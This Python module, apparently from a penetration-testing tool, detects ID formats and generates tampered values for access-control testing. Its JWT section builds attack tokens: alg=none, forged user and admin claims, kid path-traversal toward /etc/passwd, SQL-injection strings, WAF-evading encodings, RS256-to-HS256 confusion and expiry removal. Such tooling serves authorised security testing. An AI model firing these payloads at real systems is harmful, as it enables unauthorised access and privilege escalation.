# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab

"""
PhaseAccess — engine/id_engine.py
ID type detection, analysis, and candidate generation.

Detects: integer, UUID v1/v4, Base64, JWT, MD5/SHA hashes, Snowflake IDs, slugs.
Generates: tamper candidates appropriate for each type.

Standalone-safe: stdlib only.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import logging
import re
import struct
import time
import uuid
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

from .reporter import IDType

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Regex patterns
# ---------------------------------------------------------------------------

_RE_UUID      = re.compile(
  r'^[0-9a-f]{8}-[0-9a-f]{4}-([0-9a-f])[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}$',
  re.IGNORECASE,
)
_RE_MD5       = re.compile(r'^[0-9a-f]{32}$', re.IGNORECASE)
_RE_SHA1      = re.compile(r'^[0-9a-f]{40}$', re.IGNORECASE)
_RE_SHA256    = re.compile(r'^[0-9a-f]{64}$', re.IGNORECASE)
_RE_JWT       = re.compile(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$')
_RE_SLUG      = re.compile(r'^[a-z0-9]+(?:-[a-z0-9]+)+$')
_RE_INTEGER   = re.compile(r'^\d+$')
# Snowflake: 17-19 digit integer in Twitter/Discord epoch range
_RE_SNOWFLAKE = re.compile(r'^\d{17,19}$')

# Short hex strings: 2-16 hex chars (must contain ≥1 a-f to differ from plain integer)
_RE_HEX       = re.compile(r'^[0-9a-f]{2,16}$', re.IGNORECASE)

# Base64 (standard or URL-safe), padding optional
_RE_BASE64    = re.compile(r'^[A-Za-z0-9+/\-_]+=*$')


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------

def detect_id_type(value: str) -> IDType:
  """Classify the ID type of `value`."""
  v = value.strip()

  if not v:
    return IDType.UNKNOWN

  # JWT — three base64url segments separated by dots
  if _RE_JWT.match(v) and v.count('.') == 2:
    return IDType.JWT

  # UUID
  m = _RE_UUID.match(v)
  if m:
    version = int(m.group(1), 16)
    if version == 1:
      return IDType.UUID_V1
    if version == 4:
      return IDType.UUID_V4
    return IDType.UUID_UNKNOWN

  # Hex hashes — test longest first
  if _RE_SHA256.match(v):
    return IDType.HASH_SHA256
  if _RE_SHA1.match(v):
    return IDType.HASH_SHA1
  if _RE_MD5.match(v):
    return IDType.HASH_MD5

  # Snowflake before plain integer (more specific)
  if _RE_SNOWFLAKE.match(v) and _is_snowflake(v):
    return IDType.SNOWFLAKE

  if _RE_INTEGER.match(v):
    return IDType.INTEGER

  # Short hex string (at least one a-f distinguishes from pure integer)
  if _RE_HEX.match(v) and re.search(r'[a-f]', v, re.IGNORECASE):
    return IDType.HEX

  # Slug
  if _RE_SLUG.match(v):
    return IDType.SLUG

  # Base64: require at least one non-alpha char to avoid matching English words
  if len(v) >= 8 and _RE_BASE64.match(v) and re.search(r'[0-9+/=\-_]', v):
    if _is_valid_base64(v):
      return IDType.BASE64

  return IDType.UNKNOWN


def _is_snowflake(v: str) -> bool:
  """Heuristic: Snowflake IDs encode a timestamp in the upper bits.
  Twitter epoch: 1288834974657 ms (Nov 2010). Discord epoch: 1420070400000 ms.
  A valid Snowflake's timestamp should be between 2010 and ~2040."""
  try:
    n = int(v)
    # Twitter-style: top 41 bits are ms since Twitter epoch
    ts_ms = (n >> 22) + 1288834974657
    year = time.gmtime(ts_ms / 1000).tm_year
    return 2010 <= year <= 2040
  except Exception as exc:
    logger.debug("Snowflake check failed for %r: %s", v, exc)
    return False


def _is_valid_base64(v: str) -> bool:
  try:
    # Normalise URL-safe and add padding
    padded = v.replace('-', '+').replace('_', '/')
    padded += '=' * (-len(padded) % 4)
    decoded = base64.b64decode(padded)
    # Must decode to something non-trivial (not all zeros, min 4 bytes)
    return len(decoded) >= 4 and not all(b == 0 for b in decoded)
  except Exception as exc:
    logger.debug("Base64 validation failed for %r: %s", v, exc)
    return False


# ---------------------------------------------------------------------------
# Candidate generation — produce tamper values for each ID type
# ---------------------------------------------------------------------------

@dataclass
class TamperCandidate:
  value:       str
  description: str
  is_foreign:  bool = False   # True if this came from another session/user


def generate_candidates(
  value:        str,
  id_type:      IDType,
  foreign_ids:  Optional[List[str]] = None,
  count:        int = 10,
) -> List[TamperCandidate]:
  """
  Generate tamper candidate values for `value` of `id_type`.
  `foreign_ids` — IDs known to belong to a different user (multi-session mode).
  """
  candidates: List[TamperCandidate] = []

  # Foreign IDs take highest priority — these are confirmed cross-user
  if foreign_ids:
    for fid in foreign_ids[:3]:
      candidates.append(TamperCandidate(
        value=fid,
        description="foreign user's known ID",
        is_foreign=True,
      ))

  if id_type == IDType.INTEGER:
    candidates.extend(_integer_candidates(value, count))

  elif id_type in (IDType.UUID_V1, IDType.UUID_V4, IDType.UUID_UNKNOWN):
    candidates.extend(_uuid_candidates(value, id_type, count))

  elif id_type == IDType.BASE64:
    candidates.extend(_base64_candidates(value))

  elif id_type == IDType.JWT:
    candidates.extend(_jwt_candidates(value))

  elif id_type in (IDType.HASH_MD5, IDType.HASH_SHA1, IDType.HASH_SHA256):
    candidates.extend(_hash_candidates(value, id_type))

  elif id_type == IDType.HEX:
    candidates.extend(_hex_candidates(value, count))

  elif id_type == IDType.SNOWFLAKE:
    candidates.extend(_snowflake_candidates(value, count))

  elif id_type == IDType.SLUG:
    candidates.extend(_slug_candidates(value))

  else:
    # Unknown — try generic mutations
    candidates.extend(_generic_candidates(value))

  # Always test null/zero/admin edge cases
  candidates.extend(_universal_candidates())

  # Deduplicate preserving order, skip original value
  seen  = {value}
  deduped: List[TamperCandidate] = []
  for c in candidates:
    if c.value not in seen:
      seen.add(c.value)
      deduped.append(c)

  return deduped[:count + len(foreign_ids or [])]


# ---------------------------------------------------------------------------
# Type-specific generators
# ---------------------------------------------------------------------------

def _integer_candidates(value: str, count: int) -> List[TamperCandidate]:
  try:
    n = int(value)
  except ValueError:
    return []
  results = []
  # Neighbours
  for delta in range(1, min(count // 2 + 1, 20)):
    results.append(TamperCandidate(str(n + delta), f"integer +{delta}"))
    if n - delta > 0:
      results.append(TamperCandidate(str(n - delta), f"integer -{delta}"))
  # Classic edge cases
  results.append(TamperCandidate("0",   "integer zero"))
  results.append(TamperCandidate("1",   "integer one (common admin)"))
  results.append(TamperCandidate("-1",  "negative one"))
  results.append(TamperCandidate(str(n * 2), "doubled"))
  return results


def _uuid_candidates(value: str, id_type: IDType, count: int) -> List[TamperCandidate]:
  results = []

  if id_type == IDType.UUID_V1:
    # UUID v1: upper 60 bits encode timestamp — generate adjacent timestamps
    try:
      u = uuid.UUID(value)
      # uuid timestamp is 100-ns intervals since Oct 15, 1582
      ts = u.time
      for delta in [1_000_000, 10_000_000, -1_000_000, 100_000_000, -100_000_000]:
        new_ts  = ts + delta
        if new_ts < 0:
          continue
        # Reconstruct UUID v1 with adjacent timestamp
        # time_low (32 bits), time_mid (16 bits), time_hi_version (16 bits)
        time_low      = new_ts & 0xFFFFFFFF
        time_mid      = (new_ts >> 32) & 0xFFFF
        time_hi       = (new_ts >> 48) & 0x0FFF
        time_hi_ver   = time_hi | 0x1000   # version 1
        # Keep the rest from original
        clock_seq_hi  = (u.int >> 56) & 0xFF
        clock_seq_low = (u.int >> 48) & 0xFF
        node          = u.int & 0xFFFFFFFFFFFF
        new_int = (
          (time_low   << 96) |
          (time_mid   << 80) |
          (time_hi_ver << 64) |
          (clock_seq_hi << 56) |
          (clock_seq_low << 48) |
          node
        )
        new_uuid = str(uuid.UUID(int=new_int))
        results.append(TamperCandidate(new_uuid, f"UUID v1 timestamp delta {delta:+d}"))
    except Exception as exc:
      logger.debug("UUID v1 candidate generation failed for %r: %s", value, exc)

  # Nil and max UUIDs — predictable edge cases that test input validation
  results.append(TamperCandidate(
    "00000000-0000-0000-0000-000000000000", "nil UUID"))
  results.append(TamperCandidate(
    "ffffffff-ffff-ffff-ffff-ffffffffffff", "max UUID"))

  # NOTE: random UUID v4 candidates are intentionally NOT generated here.
  # They produce false positives (format accepted, random resource not found
  # → 404, indistinguishable from access control).  Foreign UUIDs from the
  # harvested pool (real IDs of other users) are added by generate_candidates()
  # as foreign TamperCandidates and are far more meaningful.

  return results


def _base64_candidates(value: str) -> List[TamperCandidate]:
  results = []
  try:
    padded  = value.replace('-', '+').replace('_', '/')
    padded += '=' * (-len(padded) % 4)
    decoded = base64.b64decode(padded).decode('utf-8', errors='replace')

    # Try to mutate the decoded value as an integer
    if decoded.isdigit():
      n = int(decoded)
      for delta in [1, -1, 2, -2, 10]:
        new_val = str(n + delta)
        enc = base64.b64encode(new_val.encode()).decode().rstrip('=')
        results.append(TamperCandidate(enc, f"Base64({new_val}) = {n}{delta:+d}"))

    # Try as "id:something" pattern (common in GraphQL relay IDs)
    if ':' in decoded:
      prefix, _, orig_id = decoded.partition(':')
      if orig_id.isdigit():
        for delta in [1, -1, 2]:
          new_id  = str(int(orig_id) + delta)
          new_raw = f"{prefix}:{new_id}"
          enc     = base64.b64encode(new_raw.encode()).decode().rstrip('=')
          results.append(TamperCandidate(enc, f"Base64({new_raw})"))

    # Raw mutation: prepend "1", "0", "admin"
    for prefix in ["1", "admin", "0"]:
      enc = base64.b64encode(prefix.encode()).decode().rstrip('=')
      results.append(TamperCandidate(enc, f"Base64({prefix!r})"))

  except Exception as exc:
    logger.debug("Base64 candidate generation failed for %r: %s", value, exc)
  return results


def _jwt_candidates(value: str) -> List[TamperCandidate]:
  """
  Produce JWT tamper candidates:
  - None algorithm (signature stripped)
  - Modified sub/user_id/id claims
  - Empty signature
  """
  import json as _json

  results = []
  parts = value.split('.')
  if len(parts) != 3:
    return results

  def _b64_decode(s: str) -> bytes:
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

  def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

  try:
    header_raw  = _b64_decode(parts[0])
    payload_raw = _b64_decode(parts[1])
    header  = _json.loads(header_raw)
    payload = _json.loads(payload_raw)
  except Exception as exc:
    logger.debug("JWT candidate generation failed for token: %s", exc)
    return results

  # 1. None algorithm — stripped signature
  none_header = dict(header)
  none_header['alg'] = 'none'
  none_h = _b64_encode(_json.dumps(none_header, separators=(',', ':')).encode())
  none_p = parts[1]
  results.append(TamperCandidate(
    f"{none_h}.{none_p}.",
    "JWT alg=none (signature stripped)",
  ))

  # 2. Tamper integer claims: sub, id, user_id, account_id, uid
  id_claim_keys = ['sub', 'id', 'user_id', 'account_id', 'uid', 'userId', 'accountId']
  for key in id_claim_keys:
    if key in payload:
      orig = payload[key]
      mutations: list = []
      if isinstance(orig, int):
        mutations = [orig + 1, orig - 1, 1, 0]
      elif isinstance(orig, str) and orig.isdigit():
        mutations = [str(int(orig) + 1), str(int(orig) - 1), "1", "0"]
      for mut in mutations[:2]:
        new_payload = dict(payload)
        new_payload[key] = mut
        new_p = _b64_encode(_json.dumps(new_payload, separators=(',', ':')).encode())
        # Keep original header + original sig (tests if sig is validated)
        results.append(TamperCandidate(
          f"{parts[0]}.{new_p}.{parts[2]}",
          f"JWT {key}={orig} → {mut} (original sig)",
        ))
        # Also with empty sig
        results.append(TamperCandidate(
          f"{parts[0]}.{new_p}.",
          f"JWT {key}={orig} → {mut} (empty sig)",
        ))
      break  # only tamper one claim at a time

  # 3. Role/admin escalation
  for role_key in ['role', 'roles', 'is_admin', 'admin', 'scope']:
    if role_key in payload:
      new_payload = dict(payload)
      orig_role = payload[role_key]
      if isinstance(orig_role, bool):
        new_payload[role_key] = True
      elif isinstance(orig_role, str):
        new_payload[role_key] = 'admin'
      elif isinstance(orig_role, list):
        new_payload[role_key] = orig_role + ['admin']
      new_p = _b64_encode(_json.dumps(new_payload, separators=(',', ':')).encode())
      results.append(TamperCandidate(
        f"{parts[0]}.{new_p}.{parts[2]}",
        f"JWT {role_key} escalated to admin (original sig)",
      ))
      break

  # 4. kid (Key ID) injection — path traversal + SQL injection variants
  #    Each path-traversal value gets three forms: raw, URL-encoded slashes,
  #    and Base64-encoded — the latter two evade WAFs that regex-match on
  #    literal "../" strings inside decoded JWT headers.
  _PATH_TRAVERSAL_KIDS = [
    "../../dev/null",
    "../../../../etc/passwd",
  ]
  _EXTRA_KIDS = [
    "' OR '1'='1",
    "0",
  ]
  if 'kid' in header:
    kid_variants: list[tuple[str, str]] = []
    for raw in _PATH_TRAVERSAL_KIDS:
      url_enc = raw.replace("/", "%2F")
      b64_enc = base64.b64encode(raw.encode()).decode()
      kid_variants.append((raw,     f"raw path traversal"))
      kid_variants.append((url_enc, f"URL-encoded slashes"))
      kid_variants.append((b64_enc, f"Base64-encoded path"))
    for raw in _EXTRA_KIDS:
      kid_variants.append((raw, f"kid injection"))

    for kid_val, label in kid_variants:
      new_header        = dict(header)
      new_header['kid'] = kid_val
      new_h = _b64_encode(_json.dumps(new_header, separators=(',', ':')).encode())
      results.append(TamperCandidate(
        f"{new_h}.{parts[1]}.{parts[2]}",
        f"JWT kid {label}: {kid_val!r} (original sig)",
      ))
      results.append(TamperCandidate(
        f"{new_h}.{parts[1]}.",
        f"JWT kid {label}: {kid_val!r} (empty sig)",
      ))

  # 5. RS256→HS256 algorithm confusion (sign-check bypass)
  if header.get('alg', '').upper() == 'RS256':
    conf_header = dict(header)
    conf_header['alg'] = 'HS256'
    new_h = _b64_encode(_json.dumps(conf_header, separators=(',', ':')).encode())
    results.append(TamperCandidate(
      f"{new_h}.{parts[1]}.",
      "JWT RS256→HS256 algorithm confusion (empty sig)",
    ))

  # 6. Remove exp claim — bypass expiry validation
  if 'exp' in payload:
    no_exp = {k: v for k, v in payload.items() if k != 'exp'}
    new_p  = _b64_encode(_json.dumps(no_exp, separators=(',', ':')).encode())
    results.append(TamperCandidate(
      f"{parts[0]}.{new_p}.",
      "JWT exp claim removed (empty sig)",
    ))

  return results


def _hash_candidates(value: str, id_type: IDType) -> List[TamperCandidate]:
  """Try to reverse common integer IDs by hashing a range."""
  results = []
  fn = {
    IDType.HASH_MD5:    lambda s: hashlib.md5(s).hexdigest(),
    IDType.HASH_SHA1:   lambda s: hashlib.sha1(s).hexdigest(),
    IDType.HASH_SHA256: lambda s: hashlib.sha256(s).hexdigest(),
  }.get(id_type)

  if fn is None:
    return results

  # Try hashes of common small integers
  for n in range(0, 200):
    candidate = fn(str(n).encode())
    if candidate.lower() == value.lower():
      # We found the pre-image — generate neighbours
      for delta in [1, 2, -1, 3, -2]:
        neighbour = fn(str(n + delta).encode())
        results.append(TamperCandidate(
          neighbour,
          f"hash({n + delta}) [pre-image of original was {n}]",
        ))
      break

  # Also try hashing "admin", "1", "0"
  for seed in ["admin", "root", "0", "1"]:
    results.append(TamperCandidate(fn(seed.encode()), f"hash({seed!r})"))

  return results


def _snowflake_candidates(value: str, count: int) -> List[TamperCandidate]:
  try:
    n = int(value)
  except ValueError:
    return []
  results = []
  # Adjacent snowflakes (same millisecond or adjacent ms)
  for delta in [1, -1, 4096, -4096, 4096 * 10, -4096 * 10]:
    results.append(TamperCandidate(str(n + delta), f"snowflake delta {delta:+d}"))
  return results


def _slug_candidates(value: str) -> List[TamperCandidate]:
  parts = value.split('-')
  results = []
  # Try integer suffix mutations
  if parts and parts[-1].isdigit():
    n = int(parts[-1])
    for delta in [1, -1, 2, -2]:
      new_parts = parts[:-1] + [str(n + delta)]
      results.append(TamperCandidate('-'.join(new_parts), f"slug suffix {n}{delta:+d}"))
  # Try known admin slugs
  for s in ['admin', 'administrator', 'root', 'test', 'demo']:
    results.append(TamperCandidate(s, f"slug override: {s!r}"))
  return results


def _hex_candidates(value: str, count: int) -> List[TamperCandidate]:
  try:
    n = int(value, 16)
  except ValueError:
    return []
  lower = value.lower() == value

  def _fmt(i: int) -> str:
    h = hex(i)[2:]
    return h if lower else h.upper()

  results = []
  for delta in range(1, min(count // 2 + 1, 10)):
    results.append(TamperCandidate(_fmt(n + delta), f"hex +{delta}"))
    if n - delta > 0:
      results.append(TamperCandidate(_fmt(n - delta), f"hex -{delta}"))
  results.append(TamperCandidate("1", "hex 1"))
  results.append(TamperCandidate("0", "hex zero"))
  return results


def _generic_candidates(value: str) -> List[TamperCandidate]:
  return [
    TamperCandidate("1",     "generic: integer 1"),
    TamperCandidate("0",     "generic: integer 0"),
    TamperCandidate("admin", "generic: admin"),
    TamperCandidate("test",  "generic: test"),
    TamperCandidate(value + "1", "generic: appended 1"),
  ]


def _universal_candidates() -> List[TamperCandidate]:
  """Edge cases that apply regardless of ID type."""
  return [
    TamperCandidate("*",      "wildcard"),
    TamperCandidate("%2A",    "URL-encoded wildcard"),
    TamperCandidate("null",   "null string"),
    TamperCandidate("undefined", "undefined"),
    TamperCandidate("../",    "path traversal prefix"),
  ]